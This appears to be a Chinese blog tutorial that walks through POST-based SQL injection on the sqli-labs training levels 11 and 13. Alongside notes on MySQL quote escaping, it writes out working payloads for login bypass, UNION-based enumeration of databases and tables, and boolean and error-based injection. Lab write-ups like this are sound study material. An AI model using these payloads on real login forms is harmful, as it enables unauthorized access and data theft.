---
title: post 注入
toc: true
description: 本文使用通过 sqli-lib 的less 11 与 13 来讲解 post 注入。
summary: 本文使用通过 sqli-lib 的less 11 与 13 来讲解 post 注入。
categories:
    - websec
    - sql injection
date: 2019-07-28 21:54:37
tags:
---

# 简介

首先,了解 get 与 post 方法.

[99%的人都理解错了 HTTP 中 GET 与 POST 的区别](https://mp.weixin.qq.com/s?__biz=MzI3NzIzMzg3Mw==&mid=100000054&idx=1&sn=71f6c214f3833d9ca20b9f7dcd9d33e4#rd)

[HTTP 方法：GET 对比 POST](https://www.w3school.com.cn/tags/html_ref_httpmethods.asp)

嗯，傍大腿的感觉真好。

下面我们进入 post 注入。

所谓 post 就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证。这就是一次 post 的过程的。（当然，没有上面链接讲得好）。

注意：

1. post 和 get 的格式：前者：在 hackbar 的 post 数据框中写 参数 1=值&参数 2=值，后者在 url 尾部 php？参数 1=值&参数 2=值。
2. 每个 post 提交数据的地方都可能存在注入点，登录框不要只关注用户名，当用户名框不行之后，再去看看密码框。
3. post 注入其实除了位置和形式变化了一下，前面回显，报错盲注，时间盲注，布尔盲注等方法还都可以用。

# 流程

此流程为注入 less 11 的流程。

## 熟悉页面

大致浏览一下页面，用正确密码登录看看登录成功与登录失败的样子。

先熟悉一下，有利于后面更好的进行注入。

## 检测注入点

先测试用户名登录栏有无 post 注入：
万能密码：

```php
uname=admin' #&passwd=125
```

测试成功

## 猜字段数

```php
uname=admin' order by 2 #&passwd=125
```

2 个字段

## 查显示位

注意查显示位的时候，通过加符号等，使得前面的查询无果。

```php
uname=-admin' union select 1,2 #&passwd=125
```

回显：

> Your Login name:1
> Your Password:2

两个显示位都有

## 数据库版本,数据库名

```php
uname=-admin' union select database(),version() #&passwd=125
```

回显：

> Your Login name:security
> Your Password:5.5.53

## 所有数据库

```php
uname=-admin' union select 1,group_concat(schema_name) from information_schema.schemata #&passwd=125
```

回显：

> Your Password:information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte

## 当前数据库下的表

```php
uname=-admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' #&passwd=125
```

回显：

> Your Password:emails,referers,uagents,users

less 11 到此为止。

# less 13

为什么还有讲一下 less 13 呢？感觉自己从 less 13 里面学到一点不知道的东西，所以要提一下。less 13 也是 post 注入，流程与上面大致相同，不再赘述，只讲几个关键的步骤。

## 检测注入点

```php
uname=admin'&passwd=admin
```

回显：

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin') LIMIT 0,1' at line 1

回显报错：admin') LIMIT 0,1，根据回显猜测：id=(1)，然后使用：uname=admin) &passwd=admin 测试不报错，奇怪，怎么会呢？根据报错来看，就应该是这样呀？于是我去看源码并查资料，这才明白，有个知识点自己没有掌握（单、双引号）：

**如果你要想在字段中包含单引号，插入的时候要使用两个单引号。mysql 的字符串/字段中的两个单引号会被当做一个单引号。**

首先要知道，这是 mysql 的问题，不是 php 或其他的问题，下面在 mysql 控制台进行复现：

```
mysql> select username,password from users where username=('admin'') and password=('admin') limit 0,
1;
    '> ';
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near 'admin') limit 0,1;
'' at line 1
```

当然，此报错最后还有两个引号，因为有一个引号是我为了匹配前面的一个单引号而加（否则不能执行），而 我猜测 php 则是将自己组合的 sql 强制执行，所以它少了一个单引号。

上面的话，不理解不要紧，请看下面这个博文。

[Mysql 中的单引号，双引号，反引号](https://blog.csdn.net/u010566813/article/details/51864375)

下面我使用 mysql 5.5.5. 进一步证实我的说法。

下面是一张表中的原始数据

```sql
mysql> select * from users;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 11       |
|  2 | Angelina | 11       |
|  3 | Dummy    | 11       |
|  4 | secure   | 11       |
|  5 | stupid   | 11       |
|  6 | superman | 11       |
|  7 | batman   | 11       |
|  8 | admin    | admin#   |
|  9 | admin1   | 11       |
| 10 | admin2   | 11       |
| 11 | admin3   | 11       |
| 12 | dhakkan  | 11       |
| 14 | admin4   | 11       |
+----+----------+----------+
13 rows in set (0.00 sec)
```

下面我插入：

```sql
insert into users values(13,'admin''','passwd');
```

让你看看效果，

```
mysql> insert into users values(13,'admin''','passwd');
Query OK, 1 row affected (0.00 sec)

mysql> select * from users;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 11       |
|  2 | Angelina | 11       |
|  3 | Dummy    | 11       |
|  4 | secure   | 11       |
|  5 | stupid   | 11       |
|  6 | superman | 11       |
|  7 | batman   | 11       |
|  8 | admin    | admin#   |
|  9 | admin1   | 11       |
| 10 | admin2   | 11       |
| 11 | admin3   | 11       |
| 12 | dhakkan  | 11       |
| 14 | admin4   | 11       |
| 13 | admin'   | passwd   |
+----+----------+----------+
14 rows in set (0.00 sec)
```

怎么样，我们插入了 admin' ，这就是我所说的两个单引号在字段中会被当成一个单引号，这也就和上面我检测注入点时的报错一样了，我使用 payload 之后，实际 sql 语句为：

```sql
SELECT username, password FROM users WHERE username=('admin'') and password=('admin') LIMIT 0
,1;
```

这里 admin'' ) ，正常来说，应该是( 'admin')，如果要在字段中包含单引号，应该是('admin'') 或 ("admin'") (后者外围是双引号，我也测试过：正常)，所以它报错认为你少了右边一个单引号来与最左边的单引号闭合 ，它将 admin'' 看为了一个字段名（数据名）。另外，也可以用 \ 转义单引号，即：username='admin\\''

下面我们使用双引号包裹

```
mysql> insert into users values(15,"admin''",'passwd');
Query OK, 1 row affected (0.00 sec)

mysql> select * from users;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 11       |
|  2 | Angelina | 11       |
|  3 | Dummy    | 11       |
|  4 | secure   | 11       |
|  5 | stupid   | 11       |
|  6 | superman | 11       |
|  7 | batman   | 11       |
|  8 | admin    | admin#   |
|  9 | admin1   | 11       |
| 10 | admin2   | 11       |
| 11 | admin3   | 11       |
| 12 | dhakkan  | 11       |
| 14 | admin4   | 11       |
| 15 | admin''  | passwd   |
| 13 | admin'   | passwd   |
+----+----------+----------+
15 rows in set (0.00 sec)
```

可见，双引号的 "admin''" 插入为 admin''，这告诉我们，内外围外围用双引号的话，里面的单引号就是正常的，你写一个单引号就是插入一个单引号。

即："admin'" 与 'admin''' 与'admin\\'' 效果是一样的。

下面看看查询：

```
mysql> select username,password from users where username=('admin''');
+----------+----------+
| username | password |
+----------+----------+
| admin'   | passwd   |
+----------+----------+
1 row in set (0.00 sec)

mysql> select username,password from users where username=("admin''");
+----------+----------+
| username | password |
+----------+----------+
| admin''  | passwd   |
+----------+----------+
1 row in set (0.00 sec)

mysql> select username,password from users where username=("admin'");
+----------+----------+
| username | password |
+----------+----------+
| admin'   | passwd   |
+----------+----------+
1 row in set (0.00 sec)

mysql> select username,password from users where username=('admin\'')
+----------+----------+
| username | password |
+----------+----------+
| admin'   | passwd   |
+----------+----------+
1 row in set (0.00 sec)
```

补：

1. mysql 的字段名、表名通常不需要加任何引号，如果非要加上引号，加反引号，用来与 mysql 的关键字相区分，避免冲突。
2. 单引号和双引号都可以表示字符串；

当然，less 13 ，注入还是老套路。

没有回显等，可以用布尔注入或报错，最后尝试时间注入。

## 测试布尔注入

```php
uname=admin') and left(version(),1)>5 #&passwd=admin
```

测试成功

## 测试报错注入

```php
uname=admin') and extractvalue(1,concat(0x23,(select version()))) #&passwd=admin
```

XPATH syntax error: '#5.5.53'
测试成功

# 总结回顾

测试成功

1. 判断是不是回显注入，主要看查询正常时，有没有回显查询的数据。

2. 报错注入存在与否，主要是 php 源码中有没有 print_r(mysql_error());

3. 布尔注入，主要在于 if(\$row) 两种情况的回显处理是否相同。
4. 延时注入存在与否取决于什么？暂不知道 emm，以后知道再补。
